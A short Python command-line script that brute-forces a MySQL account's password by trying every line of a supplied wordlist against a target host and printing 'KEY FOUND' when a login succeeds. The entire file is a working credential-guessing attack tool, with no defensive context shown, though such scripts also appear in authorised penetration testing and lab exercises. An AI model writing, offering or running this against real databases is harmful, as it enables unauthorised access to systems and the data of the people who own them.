import mysql.connector
from mysql.connector import Error
import argparse

def brute_force_mysql(host, user, password_list):
    try:
        # Try each password in the list
        for password in password_list:
            try:
                # Try to connect with the current password
                connection = mysql.connector.connect(
                    host=host,
                    user=user,
                    password=password
                )
                
                if connection.is_connected():
                    print(f"KEY FOUND: {password}")
                    connection.close()
                    return
            except Error as e:
                # If connection fails, print the error (optional)
                pass
        print("KEY NOT FOUND")
    except Exception as e:
        print(f"Error: {str(e)}")

def load_password_list(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Brute force MySQL password for a given user.")
    parser.add_argument("-l", "--username", required=True, help="The MySQL username.")
    parser.add_argument("-P", "--password-list", required=True, help="Path to the password list file.")
    parser.add_argument("mysql_url", help="MySQL target in the format mysql://<target_ip>")
    
    args = parser.parse_args()

    # Extract target IP from the URL
    target_ip = args.mysql_url.split("//")[1]
    
    # Load password list from the specified file
    password_list = load_password_list(args.password_list)

    # Call the brute force function
    brute_force_mysql(target_ip, args.username, password_list)

if __name__ == "__main__":
    main()
